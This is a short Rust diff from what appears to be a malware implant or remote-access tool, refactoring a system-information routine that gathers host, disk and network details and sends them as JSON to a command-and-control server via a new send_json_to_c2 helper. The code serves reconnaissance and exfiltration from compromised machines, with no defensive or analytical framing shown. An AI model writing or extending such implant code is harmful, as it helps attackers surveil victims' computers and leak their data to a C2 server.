@@ -1,4 +1,4 @@
-use crate::connexion::send_to_c2;
+use crate::connexion::send_json_to_c2;
 use anyhow::Result;
 use serde_json::json;
 use sysinfo::{Disks, Networks, System};
@@ -64,7 +64,6 @@ pub async fn get_sysinfo() -> Result<()> {
         "Network Details": network_details,
     });
 
-    let json_string = serde_json::to_string(&json)?;
-    send_to_c2(json_string.into_bytes()).await?;
+    send_json_to_c2(&json).await?;
     Ok(())
 }
